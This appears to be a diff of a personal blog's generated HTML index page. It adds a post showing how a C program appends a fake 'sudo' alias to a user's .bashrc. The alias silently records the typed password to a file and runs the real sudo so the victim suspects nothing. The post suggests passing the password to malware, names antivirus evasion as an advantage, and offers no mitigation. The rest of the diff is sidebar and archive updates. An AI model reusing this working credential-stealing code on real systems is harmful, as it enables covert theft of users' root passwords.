@@ -71,6 +71,59 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-Bash-aliases-can-be-dangerous-A-demonstration" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/blog/2023/02/12/Bash-aliases-can-be-dangerous-A-demonstration/" class="article-date">
+  <time class="dt-published" datetime="2023-02-11T22:20:21.000Z" itemprop="datePublished">2023-02-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/blog/2023/02/12/Bash-aliases-can-be-dangerous-A-demonstration/">Bash aliases can be dangerous! A demonstration</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>Consider the file <code>.bashrc</code>. Normally, it’s permissions are set as thus:<br><code>-rw-r--r-- 1 ghostdog ghostdog 913 Feb 12 07:55 .bashrc</code><br>Decoding this, means:<br>Owner can write (so our default user)<br>Everyone else can only read</p>
+<p>So what would happen if we ran a malicious application that affects our bashrc file?<br>Consider the following simple C program:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	FILE *fp;</span><br><span class="line">	<span class="type">char</span> *filename = <span class="string">&quot;/home/ghostdog/.bashrc&quot;</span>;</span><br><span class="line">	<span class="type">char</span>* stealer = <span class="string">&quot;alias sudo=\&#x27;fakesudo\&#x27;\nfunction fakesudo ()&#123;\n    read -sp \&quot;[sudo] password for $&#123;USER&#125;: \&quot; pass;\n    cat &lt;&lt;&lt; $pass &gt; yourpassword.txt; \n    out=`\\sudo -p \&quot;\&quot; -S &lt;&lt;&lt; $pass $@` \n    printf \&quot;\\n$&#123;out&#125;\\n\&quot;; \n&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	fp = fopen(filename, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(fp, <span class="string">&quot;%s\n&quot;</span>, stealer);</span><br><span class="line">	fclose(fp);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Which writes the following to our bashrc (commends added for clarity):</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">alias</span> sudo=<span class="string">&#x27;fakesudo&#x27;</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">fakesudo</span></span> ()&#123;</span><br><span class="line">    <span class="built_in">read</span> -sp <span class="string">&quot;[sudo] password for <span class="variable">$&#123;USER&#125;</span>: &quot;</span> pass; <span class="comment"># read our passwd</span></span><br><span class="line">    <span class="comment">#cat &lt;&lt;&lt; $pass &gt; yourpassword.txt; # Output our grabbed passwd to a file</span></span><br><span class="line">    </span><br><span class="line">    out=`\sudo -p <span class="string">&quot;&quot;</span> -S &lt;&lt;&lt; <span class="variable">$pass</span> <span class="variable">$@</span>` <span class="comment"># here we use a backslash to avoid recursively calling our own function, and the &lt;&lt;&lt; as a &#x27;here&#x27; string for</span></span><br><span class="line">                                <span class="comment"># our grabbed passwd, as well as our function args using $@ to grab all of them</span></span><br><span class="line">                                <span class="comment"># we also add the `-p &quot;&quot;` option as to avoid giving the prompt twice, which would give us away</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;\n<span class="variable">$&#123;out&#125;</span>\n&quot;</span>; <span class="comment"># here we use printf to avoid dealing with echo&#x27;s inconsistancy, and insert newlines to make the output look normal</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>When the victim runs ANY command that involves the standard util <code>sudo</code>, it will now record their password to the file <code>yourpassword.txt</code> in the current working directory. If desired, you could clearly do much more than just simply write the password, like passing this root level access to your malicious executable. E.g:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/mymalware <span class="string">&quot;--root-password=<span class="variable">$&#123;pass&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>
+<p>or similar. </p>
+<p>If we were being really nasty, we could even write the change to multiple bash startup files, as bash does not check the .bashrc file for non login shells.<br><img src="/blog/images/bash_files.png" alt="Tables of what files bash checks on startup, archwiki"></p>
+<h6 id="Image-credit-ArchWiki-Table-colours-added-by-user-Alad-on-16-Aug-2015-oldid-x3D-391339-Initial-table-also-by-Alad-oldid-x3D-335790"><a href="#Image-credit-ArchWiki-Table-colours-added-by-user-Alad-on-16-Aug-2015-oldid-x3D-391339-Initial-table-also-by-Alad-oldid-x3D-335790" class="headerlink" title="Image credit: ArchWiki, Table colours added by user Alad on 16 Aug 2015, oldid&#x3D;391339. Initial table also by Alad, oldid&#x3D;335790."></a>Image credit: ArchWiki, Table colours added by user Alad on 16 Aug 2015, oldid&#x3D;391339. Initial table also by Alad, oldid&#x3D;335790.</h6><p>This method of exploitation, as far as i am aware, has not been exploited, despite wide access to the bashrc file being common for default installations (it would be interesting to see if openbsd fixed this years ago, which I heavily suspect to be the case). And while users <em>could</em> just use <code>\sudo</code> every single time, I doubt anybody is doing that!<br>The advantage of this method, over something like replacing a binary, is that it is using <em>expected and normal tools</em>, thus it is very unlikely to trip an anti-virus or set off any red flags should someone hash their binaries to check them. </p>
+<p>Mitigation of this is left as an exercise for the reader ;-)</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://ghostdog98.github.io/blog/2023/02/12/Bash-aliases-can-be-dangerous-A-demonstration/" data-id="cle0ivldu0000b0p73lizbj7v" data-title="Bash aliases can be dangerous! A demonstration" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/blog/tags/cybersecurity-linux-bash/" rel="tag">cybersecurity, linux, bash</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-AHM-health-insurance-hacked" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/blog/2022/10/21/AHM-health-insurance-hacked/" class="article-date">
@@ -654,46 +707,6 @@
 
 
   
-    <article id="post-Hacker101-CTF-Y2FuIHlvdSByZWNvbj8" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/blog/2021/10/06/Hacker101-CTF-Y2FuIHlvdSByZWNvbj8/" class="article-date">
-  <time class="dt-published" datetime="2021-10-05T23:25:57.000Z" itemprop="datePublished">2021-10-06</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/blog/2021/10/06/Hacker101-CTF-Y2FuIHlvdSByZWNvbj8/">Hacker101 CTF: Y2FuIHlvdSByZWNvbj8/</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>This is a part of a series I’m doing for the <a target="_blank" rel="noopener" href="https://www.hacker101.com/">Hacker101</a> CTF’s.</p>
-<p>This post will focus on the latest CTF, named “Y2FuIHlvdSByZWNvbj8/“. This has 3 flags, and is rated as “Moderate”.</p>
-<h2 id="Flag-0"><a href="#Flag-0" class="headerlink" title="Flag 0"></a>Flag 0</h2>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://ghostdog98.github.io/blog/2021/10/06/Hacker101-CTF-Y2FuIHlvdSByZWNvbj8/" data-id="cl6eduwjb0009ookg1uvaekvb" data-title="Hacker101 CTF: Y2FuIHlvdSByZWNvbj8/" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -719,7 +732,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/COVID-19-coronavirus/" rel="tag">COVID-19, coronavirus</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/FPGA-programming-icelink/" rel="tag">FPGA, programming, icelink</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/bash-MacOS-Anaconda-Conda-Python-Linux/" rel="tag">bash, MacOS, Anaconda, Conda, Python, Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/bash-macos-macosx/" rel="tag">bash, macos, macosx</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/circuit-electronics/" rel="tag">circuit, electronics,</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/excel-microsoft-excel-spreadsheet-data-science-data-automation-database-base/" rel="tag">excel, microsoft excel, spreadsheet, data science, data, automation, database, base</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/scripting-bash-powershell-cmd-cli/" rel="tag">scripting, bash, powershell, cmd, cli</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/security-cybersecurity-Virgin-Media-Virgin-password-plaintext-password/" rel="tag">security, cybersecurity, Virgin Media, Virgin, password, plaintext, password</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/COVID-19-coronavirus/" rel="tag">COVID-19, coronavirus</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/FPGA-programming-icelink/" rel="tag">FPGA, programming, icelink</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/bash-MacOS-Anaconda-Conda-Python-Linux/" rel="tag">bash, MacOS, Anaconda, Conda, Python, Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/bash-macos-macosx/" rel="tag">bash, macos, macosx</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/circuit-electronics/" rel="tag">circuit, electronics,</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/cybersecurity-linux-bash/" rel="tag">cybersecurity, linux, bash</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/excel-microsoft-excel-spreadsheet-data-science-data-automation-database-base/" rel="tag">excel, microsoft excel, spreadsheet, data science, data, automation, database, base</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/scripting-bash-powershell-cmd-cli/" rel="tag">scripting, bash, powershell, cmd, cli</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/security-cybersecurity-Virgin-Media-Virgin-password-plaintext-password/" rel="tag">security, cybersecurity, Virgin Media, Virgin, password, plaintext, password</a></li></ul>
     </div>
   </div>
 
@@ -729,7 +742,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/blog/tags/COVID-19-coronavirus/" style="font-size: 10px;">COVID-19, coronavirus</a> <a href="/blog/tags/FPGA-programming-icelink/" style="font-size: 10px;">FPGA, programming, icelink</a> <a href="/blog/tags/bash-MacOS-Anaconda-Conda-Python-Linux/" style="font-size: 10px;">bash, MacOS, Anaconda, Conda, Python, Linux</a> <a href="/blog/tags/bash-macos-macosx/" style="font-size: 10px;">bash, macos, macosx</a> <a href="/blog/tags/circuit-electronics/" style="font-size: 10px;">circuit, electronics,</a> <a href="/blog/tags/excel-microsoft-excel-spreadsheet-data-science-data-automation-database-base/" style="font-size: 10px;">excel, microsoft excel, spreadsheet, data science, data, automation, database, base</a> <a href="/blog/tags/scripting-bash-powershell-cmd-cli/" style="font-size: 10px;">scripting, bash, powershell, cmd, cli</a> <a href="/blog/tags/security-cybersecurity-Virgin-Media-Virgin-password-plaintext-password/" style="font-size: 10px;">security, cybersecurity, Virgin Media, Virgin, password, plaintext, password</a>
+      <a href="/blog/tags/COVID-19-coronavirus/" style="font-size: 10px;">COVID-19, coronavirus</a> <a href="/blog/tags/FPGA-programming-icelink/" style="font-size: 10px;">FPGA, programming, icelink</a> <a href="/blog/tags/bash-MacOS-Anaconda-Conda-Python-Linux/" style="font-size: 10px;">bash, MacOS, Anaconda, Conda, Python, Linux</a> <a href="/blog/tags/bash-macos-macosx/" style="font-size: 10px;">bash, macos, macosx</a> <a href="/blog/tags/circuit-electronics/" style="font-size: 10px;">circuit, electronics,</a> <a href="/blog/tags/cybersecurity-linux-bash/" style="font-size: 10px;">cybersecurity, linux, bash</a> <a href="/blog/tags/excel-microsoft-excel-spreadsheet-data-science-data-automation-database-base/" style="font-size: 10px;">excel, microsoft excel, spreadsheet, data science, data, automation, database, base</a> <a href="/blog/tags/scripting-bash-powershell-cmd-cli/" style="font-size: 10px;">scripting, bash, powershell, cmd, cli</a> <a href="/blog/tags/security-cybersecurity-Virgin-Media-Virgin-password-plaintext-password/" style="font-size: 10px;">security, cybersecurity, Virgin Media, Virgin, password, plaintext, password</a>
     </div>
   </div>
 
@@ -738,7 +751,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2022/10/">October 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2021/09/">September 2021</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2023/02/">February 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2022/10/">October 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2021/09/">September 2021</a></li></ul>
     </div>
   </div>
 
@@ -749,6 +762,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/blog/2023/02/12/Bash-aliases-can-be-dangerous-A-demonstration/">Bash aliases can be dangerous! A demonstration</a>
+          </li>
         
           <li>
             <a href="/blog/2022/10/21/AHM-health-insurance-hacked/">AHM health insurance hacked!</a>
@@ -766,10 +783,6 @@
             <a href="/blog/2022/03/21/Creating-executables-on-MacOS-from-a-bash-sh-script/">Creating executables on MacOS from a bash (.sh) script</a>
           </li>
         
-          <li>
-            <a href="/blog/2022/03/01/Generating-large-amounts-of-dummy-data-in-excel/">Generating large amounts of &#39;dummy&#39; data in excel</a>
-          </li>
-        
       </ul>
     </div>
   </div>
@@ -783,7 +796,7 @@
   <div class="outer">
     <div id="footer-info" class="inner">
       
-      &copy; 2022 Jake Aronleigh<br>
+      &copy; 2023 Jake Aronleigh<br>
       Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
